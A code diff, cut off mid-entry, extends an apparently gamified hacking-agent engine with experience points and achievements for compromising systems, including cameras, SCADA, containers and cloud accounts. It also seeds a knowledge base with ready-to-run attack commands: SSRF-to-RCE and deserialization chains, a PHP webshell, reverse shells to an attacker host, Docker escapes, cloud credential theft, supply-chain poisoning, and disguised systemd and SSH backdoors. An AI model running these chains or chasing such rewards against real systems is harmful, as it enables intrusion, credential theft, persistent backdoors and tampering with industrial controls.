@@ -230,6 +230,53 @@ class TamagotchiEngine:
         "detection_escalated": -30,
         "target_lockout": -25,
         "connection_lost": -10,
+        # ── Advanced Exploitation ──
+        "ssrf_exploited": 75,
+        "xxe_exploited": 70,
+        "deserialization_rce": 85,
+        "jwt_bypass": 65,
+        "graphql_exploited": 70,
+        "oauth_token_stolen": 80,
+        "file_upload_webshell": 75,
+        "command_injection": 80,
+        "path_traversal": 55,
+        "idor_exploited": 60,
+        # ── Container & Cloud ──
+        "docker_escape": 150,
+        "k8s_rce": 140,
+        "container_breakout": 130,
+        "aws_access_key_found": 100,
+        "gcp_metadata_accessed": 90,
+        "cloud_role_assumed": 85,
+        "s3_bucket_exposed": 70,
+        # ── IoT & Embedded ──
+        "iot_device_hacked": 60,
+        "camera_accessed": 50,
+        "scada_exploited": 120,
+        "printer_compromised": 55,
+        "router_backdoored": 75,
+        "firmware_extracted": 40,
+        # ── Network Attacks ──
+        "vlan_hopped": 70,
+        "vxlan_hijacked": 65,
+        "ipv6_spoofed": 60,
+        "llmnr_poisoned": 55,
+        "rogue_dhcp": 50,
+        "dns_cache_poisoned": 70,
+        # ── Advanced Persistence ──
+        "pam_backdoor": 100,
+        "ld_preload_rootkit": 110,
+        "systemd_persistence": 80,
+        "cron_persistence": 60,
+        "ssh_key_persistence": 70,
+        "webshell_placed": 85,
+        "golden_ticket": 150,
+        # ── Data Operations ──
+        "credential_database_dumped": 95,
+        "password_hash_dumped": 80,
+        "token_impersonated": 85,
+        "dns_exfiltration": 90,
+        "tunnel_established": 75,
     }
 
     LEVEL_XP = [
@@ -317,6 +364,47 @@ class TamagotchiEngine:
         "zero_day_hunter": {"name": "Zero Day Hunter", "desc": "Find 10 unique CVEs", "xp": 600, "icon": "🕵️‍♂️"},
         "full_spectrum": {"name": "Full Spectrum", "desc": "Perform recon, exploit, and post-exploit in one cycle", "xp": 500, "icon": "🌈"},
         "machine_whisperer": {"name": "Machine Whisperer", "desc": "Access 3 different OS types", "xp": 450, "icon": "🤖"},
+        # ── Advanced Exploitation ──
+        "first_ssrf": {"name": "Server Whisperer", "desc": "Exploit SSRF to access internal services", "xp": 350, "icon": "🔬"},
+        "first_xxe": {"name": "XML Blaster", "desc": "Exploit XXE for file read", "xp": 300, "icon": "📄"},
+        "first_deserialization": {"name": "Deserialization Master", "desc": "Achieve RCE via deserialization", "xp": 400, "icon": "🧬"},
+        "first_jwt_bypass": {"name": "Token Forger", "desc": "Bypass JWT authentication", "xp": 300, "icon": "🎫"},
+        "first_graphql": {"name": "Schema Leaker", "desc": "Exploit GraphQL introspection", "xp": 250, "icon": "🔮"},
+        "first_sqli": {"name": "Database Raider", "desc": "Achieve SQL injection", "xp": 350, "icon": "💉"},
+        "first_command_injection": {"name": "Command Master", "desc": "Achieve OS command injection", "xp": 350, "icon": "💻"},
+        "first_rce_chain": {"name": "Chain Reaction", "desc": "Chain two vulns for RCE", "xp": 500, "icon": "⚡"},
+        # ── Container & Cloud ──
+        "first_docker_escape": {"name": "Container Breaker", "desc": "Escape a Docker container", "xp": 600, "icon": "🐳"},
+        "first_k8s_rce": {"name": "Kubernetes Dominator", "desc": "Achieve RCE in Kubernetes", "xp": 550, "icon": "☸️"},
+        "first_cloud_access": {"name": "Cloud Raider", "desc": "Gain cloud console/API access", "xp": 450, "icon": "☁️"},
+        "aws_keys_harvested": {"name": "AWS Key Hunter", "desc": "Harvest AWS access keys", "xp": 400, "icon": "🔑"},
+        # ── IoT & Embedded ──
+        "first_iot_hack": {"name": "IoT Infiltrator", "desc": "Compromise an IoT device", "xp": 300, "icon": "📡"},
+        "first_camera_access": {"name": "Peeping Tom", "desc": "Access an IP camera feed", "xp": 250, "icon": "📷"},
+        "first_scada_exploit": {"name": "ICS Pioneer", "desc": "Exploit a SCADA/ICS system", "xp": 500, "icon": "🏭"},
+        "first_router_backdoor": {"name": "Router Jockey", "desc": "Backdoor a network router", "xp": 350, "icon": "🌐"},
+        "firmware_extracted": {"name": "Firmware Analyst", "desc": "Extract and analyze device firmware", "xp": 250, "icon": "💾"},
+        # ── Network Attacks ──
+        "first_vlan_hop": {"name": "VLAN Escaper", "desc": "Perform VLAN hopping attack", "xp": 300, "icon": "🔀"},
+        "first_arp_mitm": {"name": "ARP Poisoner", "desc": "Execute ARP MITM attack", "xp": 350, "icon": "🃏"},
+        "first_dns_poison": {"name": "DNS Manipulator", "desc": "Poison DNS cache", "xp": 300, "icon": "🌐"},
+        "first_rogue_dhcp": {"name": "DHCP Impersonator", "desc": "Deploy rogue DHCP server", "xp": 250, "icon": "📡"},
+        # ── Advanced Persistence ──
+        "pam_backdoor_installed": {"name": "Skeleton Key", "desc": "Install PAM backdoor", "xp": 500, "icon": "🦴"},
+        "rootkit_installed": {"name": "Rootkit Master", "desc": "Install LD_PRELOAD rootkit", "xp": 550, "icon": "🏴"},
+        "golden_ticket_created": {"name": "Golden Ticket", "desc": "Create Kerberos Golden Ticket", "xp": 700, "icon": "🎟️"},
+        "webshell_deployed": {"name": "Webshell Artist", "desc": "Deploy webshell on target", "xp": 350, "icon": "🕸️"},
+        # ── Data Operations ──
+        "first_token_impersonation": {"name": "Token Thief", "desc": "Impersonate a Windows token", "xp": 400, "icon": "🎭"},
+        "first_credential_dump": {"name": "Dump Master", "desc": "Dump credential database", "xp": 450, "icon": "🗄️"},
+        "first_dns_exfil": {"name": "Data Smuggler", "desc": "Exfiltrate data via DNS", "xp": 400, "icon": "📦"},
+        "first_tunnel": {"name": "Tunnel Rat", "desc": "Establish covert tunnel", "xp": 350, "icon": "🐀"},
+        # ── Combo Achievements ──
+        "recon_to_root": {"name": "Zero to Root", "desc": "Full recon to root shell in one session", "xp": 800, "icon": "👑"},
+        "five_os_types": {"name": "Platform Agnostic", "desc": "Compromise 5 different OS types", "xp": 700, "icon": "🌍"},
+        "hundred_scans": {"name": "Scan Machine", "desc": "Complete 100 scans", "xp": 500, "icon": "📊"},
+        "twenty_vulns": {"name": "Vuln Hoarder", "desc": "Discover 20 vulnerabilities", "xp": 600, "icon": "🏆"},
+        "week_streak": {"name": "Dedicated", "desc": "Maintain 7-day activity streak", "xp": 400, "icon": "📅"},
     }
 
     def __init__(self):
@@ -463,11 +551,7 @@ class TamagotchiEngine:
                 logger.error(f"Failed to load mistakes: {e}")
 
     def _seed_knowledge(self):
-        """Seed knowledge base with 100+ attack patterns, workflows, CVEs, and techniques."""
-        if len(self._knowledge_log) > 50:
-            logger.info(f"Knowledge already seeded ({len(self._knowledge_log)} entries), skipping")
-            return
-
+        """Seed knowledge base with attack patterns, workflows, CVEs, and techniques. Deduplicates via log_knowledge."""
         seed = []
 
         # ══════════════════════════════════════════════════════
@@ -1833,6 +1917,1174 @@ class TamagotchiEngine:
         }, "internal"))
 
         # ══════════════════════════════════════════════════════
+        # ADVANCED SCAN COMBINATIONS (15)
+        # ══════════════════════════════════════════════════════
+        seed.append(("scan_profile", "stealth_recon_chain", {
+            "name": "Stealth Reconnaissance Chain",
+            "command": "nmap -sS -T2 -f --data-length 24 -oX /tmp/stealth_scan.xml {target} && nmap -sV -sC --version-intensity 1 -p$(grep -oP 'portid=\"\\K[0-9]+' /tmp/stealth_scan.xml | tr '\\n' ',') {target}",
+            "tools": ["nmap"],
+            "description": "SYN scan with fragmentation and decoy, followed by version detection only on discovered ports",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "full_audit_chain", {
+            "name": "Full Security Audit Chain",
+            "command": "masscan {target} -p0-65535 --rate=10000 -oL /tmp/masscan.txt && grep 'open' /tmp/masscan.txt | awk '{print $4}' | sort -u | xargs -I{} nmap -sV -sC -O --script=default,vuln -T4 {} -oN /tmp/nmap_vuln.txt",
+            "tools": ["masscan", "nmap"],
+            "description": "Fast full-port masscan followed by deep nmap vuln scan on discovered hosts only",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "iot_fingerprint", {
+            "name": "IoT Device Fingerprinting",
+            "command": "nmap -sV -sC -O -p21,22,23,53,80,443,554,8080,8443,9100 {target} --script=banner,http-title,ssl-cert,upnp-info",
+            "tools": ["nmap"],
+            "description": "Target common IoT ports with UPnP, SSL, and banner scripts for device identification",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "web_crawl_scan", {
+            "name": "Web Application Crawl and Scan",
+            "command": "nikto -h {url} -Tuning 1234567890abc -timeout 5 -maxtime 300s -o /tmp/nikto.json -Format json && sqlmap -u {url} --batch --level=1 --risk=1 --smart --crawl=3 --output-dir=/tmp/sqlmap",
+            "tools": ["nikto", "sqlmap"],
+            "description": "Nikto web scan combined with sqlmap smart crawl for SQL injection",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "snmp_deep_enum", {
+            "name": "SNMP Deep Enumeration",
+            "command": "nmap -sU -p161,162,10161,10162 -sV --script=snmp-brute,snmp-info,snmp-interfaces,snmp-win32-users,snmp-processes {target} && snmpwalk -v2c -c public {target} 1.3.6.1.2.1.1",
+            "tools": ["nmap", "snmpwalk"],
+            "description": "SNMP port scan with brute force and community string walking",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "mail_server_enum", {
+            "name": "Mail Server Enumeration",
+            "command": "nmap -p25,110,143,465,587,993,995 --script=smtp-enum-users,smtp-open-relay,imap-capabilities,pop3-capabilities {target} && nmap -p25,587 --script=smtp-brute {target}",
+            "tools": ["nmap"],
+            "description": "Enumerate mail services, users, relay capabilities, and brute force auth",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "database_audit", {
+            "name": "Database Service Audit",
+            "command": "nmap -p3306,5432,1433,1521,27017,6379,5984,9042 --script=mysql-info,pgsql-brute,mongodb-info,redis-info,memcached-info {target} && for port in 3306 5432 1433; do nmap -p$port --script=mysql-brute,pgsql-brute {target}; done",
+            "tools": ["nmap"],
+            "description": "Scan for all common databases with brute force and info gathering scripts",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "cloud_metadata_enum", {
+            "name": "Cloud Metadata Enumeration",
+            "command": "nmap -p80 --script=http-cloud-metadata-enum {target} && curl -s -o /dev/null -w '%{http_code}' http://169.254.169.254/latest/meta-data/ && curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "tools": ["nmap", "curl"],
+            "description": "Check for cloud metadata endpoint exposure (AWS/GCP/Azure)",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "wireless_pivot_scan", {
+            "name": "Wireless to Wired Pivot Scan",
+            "command": "airodump-ng {iface} --write /tmp/capture --output-format csv && nmap -sn {gateway}/24 -oG /tmp/pivot_hosts.txt && grep 'Up' /tmp/pivot_hosts.txt | awk '{print $2}' | xargs -I{} nmap -sV -T4 {} -oN /tmp/pivot_nmap.txt",
+            "tools": ["airodump-ng", "nmap"],
+            "description": "Capture WiFi clients then scan their wired network from inside",
+            "requires_auth": True,
+        }, "internal"))
+        seed.append(("scan_profile", "ssl_tls_audit", {
+            "name": "SSL/TLS Security Audit",
+            "command": "sslscan --no-colour {target}:443 && testssl --jsonfile /tmp/testssl.json {target} && nmap -p443 --script=ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-cert {target}",
+            "tools": ["sslscan", "testssl", "nmap"],
+            "description": "Full SSL/TLS cipher suite audit with known vulnerability checks",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "docker_k8s_enum", {
+            "name": "Docker/Kubernetes Enumeration",
+            "command": "nmap -p2375,2376,6443,10250,10255 --script=http-methods,http-title,ssl-cert {target} && curl -s http://{target}:2375/version && curl -s http://{target}:2375/containers/json",
+            "tools": ["nmap", "curl"],
+            "description": "Discover exposed Docker APIs and Kubernetes endpoints for container escape",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "active_directory_enum", {
+            "name": "Active Directory Enumeration",
+            "command": "nmap -p88,389,636,3268,3269,5985,5986,9389 --script=kerberos-enum-users,ldap-rootdse,ldap-search {target} && nmap -p445 --script=smb-enum-domains,smb-enum-shares,smb-enum-users,smb-os-discovery {target}",
+            "tools": ["nmap"],
+            "description": "Enumerate Kerberos, LDAP, WinRM, and SMB for Active Directory information",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "printer_enum", {
+            "name": "Printer Security Enumeration",
+            "command": "nmap -p80,443,515,631,9100 --script=http-title,http-enum,ipp-info,printer-version-info {target} && snmpwalk -v1 -c public {target} 1.3.6.1.2.1.25.3.5.1.1 && curl -s http://{target}:631/printers",
+            "tools": ["nmap", "snmpwalk", "curl"],
+            "description": "Enumerate printer models, firmware, SNMP, and CUPS status pages",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "voip_enum", {
+            "name": "VoIP/SIP Enumeration",
+            "command": "nmap -p5060,5061 --script=sip-enum-tls,sip-methods {target} && svwar -e 100-999 {target} && nmap -p166,167,168,4569 --script=sip-*-detect {target}",
+            "tools": ["nmap", "svwar"],
+            "description": "Enumerate SIP services, brute force extensions, detect VoIP endpoints",
+            "requires_auth": False,
+        }, "internal"))
+        seed.append(("scan_profile", "wireless_full_audit", {
+            "name": "Complete Wireless Security Audit",
+            "command": "airmon-ng start {iface} && airodump-ng {monitor_iface} --write /tmp/wifi_full --output-format pcapcsv && aireplay-ng --deauth 5 -a {bssid} {monitor_iface} && aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/wifi_full-01.cap",
+            "tools": ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"],
+            "description": "Full wireless audit: monitor mode, capture, deauth, and crack",
+            "requires_auth": True,
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
+        # ADVANCED EXPLOIT CHAINS (12)
+        # ══════════════════════════════════════════════════════
+        seed.append(("exploit_pattern", "ssrf_to_rce", {
+            "name": "SSRF to RCE Chain",
+            "steps": [
+                "1. Identify SSRF via parameter injection (url=, src=, dest=, redirect=)",
+                "2. Probe internal services: http://127.0.0.1:8080/, http://169.254.169.254/latest/meta-data/",
+                "3. Chain with file read: file:///etc/passwd, file:///proc/self/environ",
+                "4. Pivot to Redis/Memcached: gopher://127.0.0.1:6379/_*3%0d%0a",
+                "5. Redis file write for webshell: SET /var/www/html/shell.php",
+                "6. Trigger webshell for RCE",
+            ],
+            "tools": ["curl", "Burp Suite", "redis-cli"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "owasp"))
+        seed.append(("exploit_pattern", "xxe_to_file_read", {
+            "name": "XXE to File Read and SSRF",
+            "steps": [
+                "1. Inject DTD entity in XML input: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
+                "2. Reference entity in parameter: <data>&xxe;</data>",
+                "3. Blind XXE: use out-of-band exfil via external DTD",
+                "4. Use XXE for SSRF to internal services",
+                "5. Combine with SSRF chain for RCE",
+            ],
+            "tools": ["curl", "Burp Suite"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "owasp"))
+        seed.append(("exploit_pattern", "deserialization_attack", {
+            "name": "Java Deserialization RCE",
+            "steps": [
+                "1. Identify serialized Java objects in cookies, parameters, headers",
+                "2. Look for class names like CommonsCollections, Spring, Fastjson",
+                "3. Generate ysoserial payload: java -jar ysoserial.jar CommonsCollections5 'cmd'",
+                "4. Base64-encode and inject into serialized field",
+                "5. Trigger deserialization endpoint",
+                "6. Catch reverse shell on listener",
+            ],
+            "tools": ["ysoserial", "Burp Suite", "nc"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("exploit_pattern", "jwt_none_algorithm", {
+            "name": "JWT None Algorithm Bypass",
+            "steps": [
+                "1. Decode JWT header: echo 'header.payload.signature' | base64 -d",
+                "2. Check if alg field is RS256 or HS256",
+                "3. Modify header to {\"alg\":\"none\",\"typ\":\"JWT\"}",
+                "4. Remove signature portion (keep trailing dot)",
+                "5. Encode modified token: echo -n 'header.payload.' | base64",
+                "6. Send modified token in Authorization header",
+            ],
+            "tools": ["jwt_tool", "curl"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "owasp"))
+        seed.append(("exploit_pattern", "oauth_token_theft", {
+            "name": "OAuth Token Theft and Replay",
+            "steps": [
+                "1. Intercept authorization code in OAuth redirect",
+                "2. Exchange code for access token at /oauth/token",
+                "3. Use stolen token to access protected resources",
+                "4. If refresh token obtained, maintain persistent access",
+                "5. Check for token in URL fragments, referer headers",
+            ],
+            "tools": ["Burp Suite", "curl", "oauth2-proxy"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "owasp"))
+        seed.append(("exploit_pattern", "graphql_introspection", {
+            "name": "GraphQL Introspection and Exploitation",
+            "steps": [
+                "1. Detect GraphQL endpoint: POST /graphql or /graphiql",
+                "2. Run introspection query: {__schema{types{name,fields{name}}}}",
+                "3. Enumerate all types, queries, mutations",
+                "4. Look for admin mutations (deleteUser, updateRole, etc.)",
+                "5. Test for injection in query parameters",
+                "6. Brute force mutation arguments for access bypass",
+            ],
+            "tools": ["graphql-cop", "curl", "Burp Suite"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "owasp"))
+        seed.append(("exploit_pattern", "smb_signing_disabled", {
+            "name": "SMB Signing Disabled Relay",
+            "steps": [
+                "1. Enumerate hosts with SMB signing disabled: nmap --script=smb-security-mode -p445 targets",
+                "2. Set up ntlmrelayx: ntlmrelayx.py -t target -smb2support",
+                "3. Poison LLMNR/mDNS: responder -I eth0",
+                "4. Wait for victim to connect (or force via wmic /target)",
+                "5. Relay captured NTLMv2 hash to target",
+                "6. Access shares or execute commands via relayed session",
+            ],
+            "tools": ["ntlmrelayx", "responder", "nmap"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "printer_spooler_exploit", {
+            "name": "PrintNightmare (CVE-2021-34527)",
+            "steps": [
+                "1. Check if Spooler service is running: nmap -p445 --script=msrpc-enum target",
+                "2. Test for vulnerability: python3 printnightmare.py --target target --share \\\\target\\IPC$ --user guest --password ''",
+                "3. If vulnerable, add user or dump SAM: python3 printnightmare.py --target target --share \\\\target\\IPC$ --user admin --password P@ss --add-user pentest",
+                "4. Connect: smbclient \\\\target\\IPC$ -U pentest",
+                "5. Execute commands via psexec-style or WMI",
+            ],
+            "tools": ["printnightmare", "smbclient", "nmap"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("exploit_pattern", "smbghost_rce", {
+            "name": "SMBGhost RCE (CVE-2020-0796)",
+            "steps": [
+                "1. Detect SMBv3 compression: nmap -p445 --script=smb-vuln-ms20-0796 target",
+                "2. Confirm vulnerability with scanner script",
+                "3. Exploit: python3 smbghost.py -ip target -p 4444",
+                "4. Or use Metasploit: use exploit/windows/smb/ms20_0796_smbghost",
+                "5. Catch reverse shell on listener",
+            ],
+            "tools": ["nmap", "msfconsole"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("exploit_pattern", "winrm_exec", {
+            "name": "WinRM Remote Code Execution",
+            "steps": [
+                "1. Check WinRM ports: nmap -p5985,5986 --script=http-title target",
+                "2. Test credentials: crackmapexec winrm target -u user -p pass",
+                "3. Execute via evil-winrm: evil-winrm -i target -u user -p pass",
+                "4. Or use Ruby: ruby -e 'require \"winrm\"; conn = WinRM::Connection.new(...)'",
+                "5. Upload tools: upload /local/path /remote/path",
+                "6. Establish persistent shell",
+            ],
+            "tools": ["evil-winrm", "crackmapexec", "nmap"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "vnc_bypass", {
+            "name": "VNC Authentication Bypass",
+            "steps": [
+                "1. Detect VNC: nmap -p5900-5910 --script=vnc-info target",
+                "2. If no auth required, connect: vncviewer target::5900",
+                "3. If weak auth, brute force: hydra -l '' -P /usr/share/wordlists/rockyou.txt vnc://target",
+                "4. If Metasploit available: use auxiliary/scanner/vnc/vnc_none_auth",
+                "5. Use autoroute + portfwd for pivoting through VNC session",
+            ],
+            "tools": ["nmap", "vncviewer", "hydra"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "rce_via_file_upload", {
+            "name": "Webshell via Unrestricted File Upload",
+            "steps": [
+                "1. Find upload endpoint: gobuster dir -u http://target -w common.txt -x php,jsp,aspx",
+                "2. Test upload restrictions: try .php.jpg, .php5, .phtml, .phar",
+                "3. Bypass client-side validation: intercept with Burp, modify Content-Type",
+                "4. Upload webshell: <?php echo system($_GET['cmd']); ?>",
+                "5. Access uploaded file: http://target/uploads/shell.php?cmd=id",
+                "6. Upgrade to reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1",
+            ],
+            "tools": ["gobuster", "Burp Suite", "curl"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "owasp"))
+
+        # ══════════════════════════════════════════════════════
+        # CONTAINER AND CLOUD ATTACKS (10)
+        # ══════════════════════════════════════════════════════
+        seed.append(("exploit_pattern", "docker_escape_volume", {
+            "name": "Docker Container Escape via Volume Mount",
+            "steps": [
+                "1. Check mounted volumes: mount | grep -E '/var/run/docker.sock|/proc|/etc'",
+                "2. If docker.sock mounted: docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host",
+                "3. If /proc mounted: nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
+                "4. If /etc mounted: write SSH key to /etc/ssh/authorized_keys",
+            ],
+            "tools": ["docker", "nsenter"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "mitre"))
+        seed.append(("exploit_pattern", "k8s_rce_via_dashboard", {
+            "name": "Kubernetes Dashboard RCE",
+            "steps": [
+                "1. Access dashboard: https://target:8443",
+                "2. If token available: create namespace, deploy privileged pod",
+                "3. kubectl create namespace pwn --dry-run=client -o yaml | kubectl apply -f -",
+                "4. Deploy privileged pod: spec.containers[0].securityContext.privileged=true",
+                "5. Mount host filesystem via /host volume",
+                "6. Chroot into host: chroot /host /bin/bash",
+            ],
+            "tools": ["kubectl", "curl"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("exploit_pattern", "aws_s3_bucket_abuse", {
+            "name": "AWS S3 Bucket Enumeration and Abuse",
+            "steps": [
+                "1. Enumerate bucket names: bucket_finder.py -t company-names.txt",
+                "2. Test public access: aws s3 ls s3://bucket-name --no-sign-request",
+                "3. Download contents: aws s3 sync s3://bucket-name ./exfil --no-sign-request",
+                "4. Check for credentials in files: grep -r 'AKIA' ./exfil",
+                "5. If IAM role assumed: enumerate services, escalate privileges",
+            ],
+            "tools": ["aws-cli", "bucket_finder"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "gcp_metadata_exploit", {
+            "name": "GCP Metadata Service Exploitation",
+            "steps": [
+                "1. Check if metadata is reachable: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/",
+                "2. Get service account token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                "3. Use token for API calls: curl -H 'Authorization: Bearer TOKEN' https://compute.googleapis.com/compute/v1/projects/PROJECT/zones",
+                "4. Enumerate disks, instances, networks",
+            ],
+            "tools": ["curl"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("exploit_pattern", "container_escape_procfs", {
+            "name": "Container Escape via /proc Mount",
+            "steps": [
+                "1. Check /proc/self/ns/pid visibility: ls -la /proc/1/ns/",
+                "2. If /proc is accessible: nsenter -t 1 -p -m -- /bin/bash",
+                "3. If seccomp is not enforced: exploit kernel vulnerability",
+                "4. Use CVE-2022-0185 (heap overflow) for escape",
+                "5. Use PwnKit (CVE-2021-4034) if SUID binaries available",
+            ],
+            "tools": ["nsenter", "gcc"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("exploit_pattern", "supply_chain_poison", {
+            "name": "Package Manager Supply Chain Attack",
+            "steps": [
+                "1. Identify package manager: npm, pip, gem, maven",
+                "2. Check typosquatting: search for similar package names",
+                "3. Look for packages with postinstall scripts",
+                "4. Check if registry allows publishing without verification",
+                "5. If access: publish malicious package with same name",
+                "6. Monitor for downloads and callbacks",
+            ],
+            "tools": ["npm", "pip", "gem"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
+        # IOT AND EMBEDDED ATTACKS (10)
+        # ══════════════════════════════════════════════════════
+        seed.append(("exploit_pattern", "camera_default_creds", {
+            "name": "IP Camera Default Credential Attack",
+            "steps": [
+                "1. Identify camera: nmap -p80,554,8000,8080,37777 --script=http-title,target target",
+                "2. Access RTSP stream: ffprobe rtsp://admin:admin@target:554/stream1",
+                "3. Brute force RTSP: hydra -l admin -P /usr/share/wordlists/camera-defaults.txt rtsp://target",
+                "4. Download firmware: wget http://target/firmware.bin",
+                "5. Extract credentials: binwalk -e firmware.bin && grep -r 'password' _firmware.bin.extracted/",
+            ],
+            "tools": ["nmap", "ffprobe", "hydra", "binwalk"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "router_config_leak", {
+            "name": "Router Configuration File Leak",
+            "steps": [
+                "1. Check for backup download: http://target/backup.cfg, http://target:8080/cgi-bin/download",
+                "2. Try TFTP: tftp target -c get config.bin",
+                "3. Decode config: strings config.bin | grep -E 'password|key|token|secret'",
+                "4. Use routerexploit for known models: routerexploit --target target --model model",
+                "5. If admin panel found: default creds scan",
+            ],
+            "tools": ["nmap", "tftp", "strings", "routerexploit"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "scada_plc_exploit", {
+            "name": "SCADA/PLC Exploitation",
+            "steps": [
+                "1. Enumerate Modbus: nmap -p502 --script=modbus-discover target",
+                "2. Read holding registers: mbtget -r 1 -n 10 target 502",
+                "3. Enumerate BACnet: nmap -p47808 --script=bacnet-info target",
+                "4. Check for S7comm: nmap -p102 --script=s7-info target",
+                "5. If exposed: write arbitrary values to PLC registers",
+                "6. Document all findings (DO NOT modify production systems)",
+            ],
+            "tools": ["nmap", "mbtget", "codesys"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("exploit_pattern", "smart_home_pivot", {
+            "name": "Smart Home Hub Pivot",
+            "steps": [
+                "1. Identify hub: UPnP discovery, mDNS scan",
+                "2. Check API endpoints: http://target:8080/api/, http://target/api/v1/",
+                "3. Enumerate connected devices via API",
+                "4. Check for MQTT exposure: nmap -p1883,8883 target",
+                "5. Subscribe to MQTT topics: mosquitto_sub -t '#' -h target",
+                "6. Replay commands for device control",
+            ],
+            "tools": ["nmap", "mosquitto_sub", "curl"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "printer_firmware_mod", {
+            "name": "Printer Firmware Modification",
+            "steps": [
+                "1. Download current firmware: wget http://target/firmware/update.bin",
+                "2. Extract and analyze: binwalk -e update.bin",
+                "3. Find writable filesystem in firmware",
+                "4. Modify boot scripts or inject backdoor",
+                "5. Rebuild and upload modified firmware",
+                "6. Reboot printer to activate modified firmware",
+            ],
+            "tools": ["binwalk", "wget", "python"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("exploit_pattern", "nas_rce", {
+            "name": "NAS Device Remote Code Execution",
+            "steps": [
+                "1. Identify NAS brand: nmap -p80,443,5000,8080,139,445 --script=http-title target",
+                "2. Check for known vulns: Synology DSM, QNAP, Western Digital",
+                "3. If vulnerable: use public exploit from exploit-db",
+                "4. Example Synology: CVE-2022-27610 unauthenticated RCE",
+                "5. Access admin panel: http://target:5000/webman/login.cgi",
+                "6. Upload backdoor via admin interface",
+            ],
+            "tools": ["nmap", "msfconsole"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
+        # ADVANCED PERSISTENCE (10)
+        # ══════════════════════════════════════════════════════
+        seed.append(("backdoor", "systemd_timer_backdoor", {
+            "name": "Systemd Timer Persistence",
+            "command": "cat > /etc/systemd/system/update-check.service << 'EOF'\n[Unit]\nDescription=System Update Check\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\nEOF\ncat > /etc/systemd/system/update-check.timer << 'EOF'\n[Unit]\nDescription=Daily Update Check\n[Timer]\nOnCalendar=daily\nPersistent=true\n[Install]\nWantedBy=timers.target\nEOF\nsystemctl enable --now update-check.timer",
+            "tools": ["systemctl"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("backdoor", "openssh_backdoor_key", {
+            "name": "SSH Backdoor via Authorized Keys",
+            "command": "mkdir -p /root/.ssh && echo 'ssh-rsa AAAAAttackerPublicKey...' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys",
+            "tools": ["ssh-keygen", "ssh"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("backdoor", "ld_preload_rootkit", {
+            "name": "LD_PRELOAD Rootkit",
